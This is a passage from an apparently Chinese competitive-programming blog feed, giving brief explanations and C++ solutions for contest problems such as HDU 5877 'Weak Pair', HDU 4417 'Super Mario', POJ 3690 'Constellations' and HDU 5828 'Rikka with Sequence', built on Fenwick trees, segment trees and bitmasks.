add[rt]+=d;</div><div class="line">        sum[rt]+=d;</div><div class="line">        return;</div><div class="line">    &#125;</div><div class="line">    push_down(rt);</div><div class="line">    int m=(l+r)&gt;&gt;1;</div><div class="line">    if (L&lt;=m) update(L,R,d,lson);</div><div class="line">    if (m&lt;R) update(L,R,d,rson);</div><div class="line">    push_up(rt);</div><div class="line">&#125;</div><div class="line"></div><div class="line">ll query(int L,int R,int l,int r,int rt)</div><div class="line">&#123;</div><div class="line">    if (L&lt;=l&amp;&amp;r&lt;=R) &#123;</div><div class="line">        return sum[rt];</div><div class="line">    &#125;</div><div class="line">    push_down(rt);</div><div class="line">    int m=(l+r)&gt;&gt;1;</div><div class="line">    ll res=0;</div><div class="line">    if (L&lt;=m) res=max(res,query(L,R,lson));</div><div class="line">    if (m&lt;R) res=max(res,query(L,R,rson));</div><div class="line">    return res;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int ins(int k,int d)</div><div class="line">&#123;</div><div class="line">    int i;</div><div class="line">    for (i=k;i&lt;=n&amp;&amp;p[i].ix==p[k].ix;i++) &#123;</div><div class="line">        int pos=upper_bound(qy+1,qy+cnty+1,p[i].y+r)-qy-1;</div><div class="line">        update(p[i].iy,pos,d,1,cnty,1);</div><div class="line">    &#125;</div><div class="line">    return i;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">    while (scanf("%d%d",&amp;n,&amp;r)!=EOF) &#123;</div><div class="line">        cntx=cnty=0;</div><div class="line">        for (int i=1;i&lt;=n;i++) &#123;</div><div class="line">            scanf("%d%d",&amp;p[i].x,&amp;p[i].y);</div><div class="line">            qx[++cntx]=p[i].x;</div><div class="line">            qy[++cnty]=p[i].y;</div><div class="line">        &#125;</div><div class="line">        sort(qx+1,qx+cntx+1);</div><div class="line">        sort(qy+1,qy+cnty+1);</div><div class="line">        cntx=unique(qx+1,qx+cntx+1)-qx-1;</div><div class="line">        cnty=unique(qy+1,qy+cnty+1)-qy-1;</div><div class="line">        for (int i=1;i&lt;=n;i++) &#123;</div><div class="line">            p[i].ix=lower_bound(qx+1,qx+cntx+1,p[i].x)-qx;</div><div class="line">            p[i].iy=lower_bound(qy+1,qy+cnty+1,p[i].y)-qy;</div><div class="line">        &#125;</div><div class="line">        sort(p+1,p+n+1);</div><div class="line">        memset(sum,0,sizeof(sum));</div><div class="line">        memset(add,0,sizeof(add));</div><div class="line">        int ans=0;</div><div class="line">        for (int i=1,k=1;i&lt;=n;) &#123;</div><div class="line">            while (k&lt;=n&amp;&amp;p[k].x-p[i].x&lt;=r) &#123;</div><div class="line">                k=ins(k,1);</div><div class="line">            &#125;</div><div class="line">            ans=max((ll)ans,sum[1]);</div><div class="line">            i=ins(i,-1);</div><div class="line">        &#125;</div><div class="line">        printf("%d\n",ans);</div><div class="line">    &#125;</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="Weak-Pair"><a href="#Weak-Pair" class="headerlink" title="Weak Pair"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5877" target="_blank" rel="noopener">Weak Pair</a></h3><p>题意：一棵树的每个节点有一个非负权值，如果 $u$ 是 $v$ 的祖先($u\neq v$)，并且两点的权值的积 $a_u*a_v\leq k$ ，则称它们为”Weak Pair”。求”Weak Pair”的数目。<br>题解：由于树中任意一个节点的祖先都在同一条链上，所以只需要考虑如何快速的求出一条链上的”Weak Pair”。这题有很多解法，我想到的是将祖先都插入到树状数组，那么在 $u$ 这一点，答案就加上 $x\leq \frac{k}{a_u}$ 的个数。<br>考虑到权值范围很大，要用离散化，并且要注意 $a_u=0$ 的情况，代码如下：<br>【还有一点就是，题目给的是明确的父子关系，但是没有给根，一定要自己找，WA3 = =<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">1e5</span>+<span class="number">5</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX=<span class="number">2</span>*N;</div><div class="line"><span class="keyword">const</span> <span class="keyword">long</span> <span class="keyword">long</span> INF=<span class="number">1L</span>L&lt;&lt;<span class="number">33</span>;</div><div class="line"><span class="keyword">long</span> <span class="keyword">long</span> a[N],b[N],A[<span class="number">2</span>*N];</div><div class="line"><span class="keyword">int</span> c[MAX];</div><div class="line"><span class="keyword">struct</span> edge &#123;</div><div class="line">    <span class="keyword">int</span> go,next;</div><div class="line">&#125; eg[<span class="number">2</span>*N];</div><div class="line"><span class="keyword">int</span> last[N];</div><div class="line"><span class="keyword">bool</span> vis[N];</div><div class="line"><span class="keyword">int</span> tot;</div><div class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">adde</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></div><div class="line">&#123;</div><div class="line">    eg[++tot].go=y;</div><div class="line">    eg[tot].next=last[x];</div><div class="line">    last[x]=tot;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">ins</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> d)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">for</span> (;x&lt;MAX;x+=x&amp;(-x)) &#123;</div><div class="line">        c[x]+=d;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> x)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">long</span> <span class="keyword">long</span> res=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (;x;x-=x&amp;(-x)) &#123;</div><div class="line">        res+=c[x];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x)</span></span></div><div class="line">&#123;</div><div class="line">    ans+=query(b[x]);</div><div class="line">    ins(a[x],<span class="number">1</span>);</div><div class="line"><span class="comment">//    printf("%d %d\n",x,ans);</span></div><div class="line">    </div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=last[x];i;i=eg[i].next) &#123;</div><div class="line">        dfs(eg[i].go);</div><div class="line">    &#125;</div><div class="line">    ins(a[x],<span class="number">-1</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T,n;</div><div class="line">    <span class="keyword">long</span> <span class="keyword">long</span> k;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        tot=<span class="number">0</span>;</div><div class="line">        <span class="built_in">memset</span>(last,<span class="number">0</span>,<span class="keyword">sizeof</span>(last));</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%lld"</span>,&amp;n,&amp;k);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123; </div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%lld"</span>,&amp;a[i]);</div><div class="line">            A[i]=a[i];</div><div class="line">            <span class="keyword">if</span> (a[i]==<span class="number">0</span>) &#123;</div><div class="line">                A[n+i]=b[i]=INF;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span> &#123;</div><div class="line">                A[n+i]=b[i]=k/a[i];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        sort(A+<span class="number">1</span>,A+<span class="number">1</span>+n*<span class="number">2</span>);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            a[i]=lower_bound(A+<span class="number">1</span>,A+<span class="number">1</span>+<span class="number">2</span>*n,a[i])-A;</div><div class="line">            b[i]=lower_bound(A+<span class="number">1</span>,A+<span class="number">1</span>+<span class="number">2</span>*n,b[i])-A;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">memset</span>(vis,<span class="number">0</span>,<span class="keyword">sizeof</span>(vis));</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++) &#123;</div><div class="line">            <span class="keyword">int</span> x,y;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;x,&amp;y);</div><div class="line">            adde(x,y);</div><div class="line">            vis[y]=<span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> i=<span class="number">1</span>;</div><div class="line">        <span class="keyword">while</span> (i&lt;=n&amp;&amp;vis[i]) i++;</div><div class="line">        ans=<span class="number">0</span>;</div><div class="line">        dfs(i);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hdu 4417 Super Mario</title>
      <url>/blog/2016/09/08/hdu4417/</url>
      <content type="html"><![CDATA[<p>这题很明显离线做比较水。。。</p><p>把询问和每块砖都按高度排序<br>不断向树状数组插入满足条件的砖的位置<br>对每个询问求在 [L,R]  的区间和<br>也就是把前缀和减一减<br>【树状数组不能有0，所以传参之前我都加了1。。。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">1e5</span>+<span class="number">5</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX=N;</div><div class="line"><span class="keyword">struct</span> query &#123;</div><div class="line">    <span class="keyword">int</span> l,r,h,id;</div><div class="line">&#125; q[N];</div><div class="line"><span class="keyword">struct</span> brick &#123;</div><div class="line">    <span class="keyword">int</span> h,pos;</div><div class="line">&#125; a[N];</div><div class="line"><span class="keyword">int</span> c[MAX],ans[N];</div><div class="line"></div><div class="line"><span class="keyword">struct</span> cmp &#123;</div><div class="line">    <span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt; </div><div class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">const</span> T &amp;a,<span class="keyword">const</span> T &amp;b)</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> a.h&lt;b.h;</div><div class="line">    &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">ins</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> d)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">for</span> (;x&lt;MAX;x+=x&amp;(-x)) &#123;</div><div class="line">        c[x]+=d;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> x)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (;x;x-=x&amp;(-x)) &#123;</div><div class="line">        res+=c[x];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T,n,m;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> t=<span class="number">1</span>;t&lt;=T;t++) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i].h);</div><div class="line">            a[i].pos=i;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;q[i].l,&amp;q[i].r,&amp;q[i].h);</div><div class="line">            q[i].id=i;</div><div class="line">        &#125;</div><div class="line">        sort(a,a+n,cmp());</div><div class="line">        sort(q,q+m,cmp());</div><div class="line">        <span class="keyword">int</span> k=<span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++) &#123;</div><div class="line">            <span class="keyword">for</span> (;k&lt;n&amp;&amp;a[k].h&lt;=q[i].h;k++)</div><div class="line">                ins(a[k].pos+<span class="number">1</span>,<span class="number">1</span>);</div><div class="line">            ans[q[i].id]=query(q[i].r+<span class="number">1</span>)-query(q[i].l<span class="number">-1</span>+<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Case %d:\n"</span>,t);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ans[i]);</div><div class="line">        <span class="built_in">memset</span>(c,<span class="number">0</span>,<span class="keyword">sizeof</span>(c));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>poj 3690 Constellations</title>
      <url>/blog/2016/09/08/poj3690/</url>
      <content type="html"><![CDATA[<p>最近在翻 ICPC online 的题。。。<br>终于找到一个能做的水题结果WA了七八次。。。<br>可能我果然还是不会C/C++语言吧  OTZ</p><p>行状压和列状压都行吧。。。<br>然后我就暴力枚举右下角<br>感觉写的比能查到的题解好看一点。。。<br><img src="http://img.blog.csdn.net/20160908104400692" alt=""> 【差点就全服最短了2333333</p><p>goto 什么的要谨慎。。。不行就写成函数嘛</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">int</span> n,m,t,p,q;</div><div class="line"><span class="keyword">char</span> <span class="built_in">map</span>[<span class="number">1010</span>][<span class="number">1010</span>],pat[<span class="number">60</span>][<span class="number">60</span>];</div><div class="line">ll ro[<span class="number">1010</span>][<span class="number">1010</span>],mat[<span class="number">60</span>];</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> cas=<span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d%d%d%d%d"</span>,&amp;n,&amp;m,&amp;t,&amp;p,&amp;q),n) &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%s"</span>,<span class="built_in">map</span>[i]);</div><div class="line">        ll mask=(<span class="number">1L</span>L&lt;&lt;q)<span class="number">-1</span>;<span class="comment">//就因为只写了1没写LL结果WA了两小时。。。 </span></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</div><div class="line">            ll tmp=<span class="number">0</span>;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)</div><div class="line">                ro[i][j]=tmp=((tmp&lt;&lt;<span class="number">1</span>)|(<span class="built_in">map</span>[i][j]==<span class="string">'*'</span>))&amp;mask;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> ans=<span class="number">0</span>;</div><div class="line">WCON:</div><div class="line">        <span class="keyword">while</span> (t--) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;p;i++)</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"%s"</span>,pat[i]);</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;p;i++) &#123;</div><div class="line">                ll tmp=<span class="number">0</span>;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;q;j++)</div><div class="line">                    tmp=(tmp&lt;&lt;<span class="number">1</span>)|(pat[i][j]==<span class="string">'*'</span>);</div><div class="line">                mat[i]=tmp;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=p<span class="number">-1</span>;i&lt;n;i++) &#123;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j=q<span class="number">-1</span>;j&lt;m;j++)</div><div class="line">                    <span class="keyword">if</span> (ro[i][j]==mat[p<span class="number">-1</span>]) &#123;</div><div class="line">                        <span class="keyword">int</span> k=<span class="number">0</span>;</div><div class="line">                        <span class="keyword">while</span> (k&lt;p&amp;&amp;ro[i-k][j]==mat[p<span class="number">-1</span>-k]) k++;</div><div class="line">                        <span class="keyword">if</span> (k==p) &#123;</div><div class="line">                            ans++;</div><div class="line">                            <span class="keyword">goto</span> WCON;</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Case %d: %d\n"</span>,++cas,ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hdu 5828 Rikka with Sequence</title>
      <url>/blog/2016/08/20/hdu5828/</url>
      <content type="html"><![CDATA[<p>多校8的一道题。。。 【看标题识出题人 ←_←<br>非常蛋疼的一道题，官方题解根本不知道在说什么，标程写得跟坨屎一样= =<br>先贴一份比赛中菊苣AC的代码</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/************************************************</span></div><div class="line"> *Author        :mathon</div><div class="line"> *Email         :luoxinchen96@gmail.com</div><div class="line">*************************************************/</div><div class="line"><span class="meta">#include <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#include <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#include <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#include <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#include <span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#include <span class="meta-string">&lt;queue&gt;</span></span></div><div class="line"><span class="meta">#include <span class="meta-string">&lt;set&gt;</span></span></div><div class="line"><span class="meta">#include <span class="meta-string">&lt;map&gt;</span></span></div><div class="line"><span class="meta">#include <span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#include <span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"><span class="meta">#include <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#include <span class="meta-string">&lt;ctime&gt;</span></span></div><div class="line"><span class="meta">#include <span class="meta-string">&lt;stack&gt;</span></span></div><div class="line">using namespace std;</div><div class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; pii;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> ull;</div><div class="line"><span class="meta">#define xx first</span></div><div class="line"><span class="meta">#define yy second</span></div><div class="line"><span class="meta">#define pr(x) cout <span class="meta-string">&lt;&lt; #x &lt;&lt; " " &lt;&lt; x &lt;&lt; " "</span></span></div><div class="line">#define prln(x) cout &lt;&lt; #x &lt;&lt; " " &lt;&lt; x &lt;&lt; endl</div><div class="line">#define lson l, m, rt &lt;&lt; 1</div><div class="line">#define rson m+1, r, rt &lt;&lt; 1|1</div><div class="line">template&lt;class T&gt; inline T lowbit(T x) &#123; return x &amp; (-x); &#125;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAXN = <span class="number">1e5</span> + <span class="number">5</span>;</div><div class="line"><span class="keyword">int</span> A[MAXN];</div><div class="line"><span class="keyword">struct</span> SegT &#123;</div><div class="line">    ll sum[MAXN&lt;&lt;<span class="number">2</span>];</div><div class="line">    ll is_same[MAXN&lt;&lt;<span class="number">2</span>], lazy[MAXN&lt;&lt;<span class="number">2</span>];</div><div class="line">    <span class="keyword">void</span> init() &#123;</div><div class="line">        memset(sum, <span class="number">0</span>, <span class="keyword">sizeof</span>(sum));</div><div class="line">        memset(is_same, <span class="number">0</span>, <span class="keyword">sizeof</span>(is_same));</div><div class="line">        memset(lazy, <span class="number">0</span>, <span class="keyword">sizeof</span>(lazy));</div><div class="line">    &#125;</div><div class="line">   </div><div class="line">    <span class="keyword">void</span> push_up(<span class="keyword">int</span> rt) &#123;</div><div class="line">        <span class="keyword">if</span>(is_same[rt &lt;&lt; <span class="number">1</span>] &amp;&amp; is_same[rt &lt;&lt; <span class="number">1</span> | <span class="number">1</span>] &amp;&amp;</div><div class="line">                is_same[rt &lt;&lt; <span class="number">1</span>] == is_same[rt &lt;&lt; <span class="number">1</span> | <span class="number">1</span>]) &#123;</div><div class="line">            is_same[rt] = is_same[rt &lt;&lt; <span class="number">1</span>];</div><div class="line">        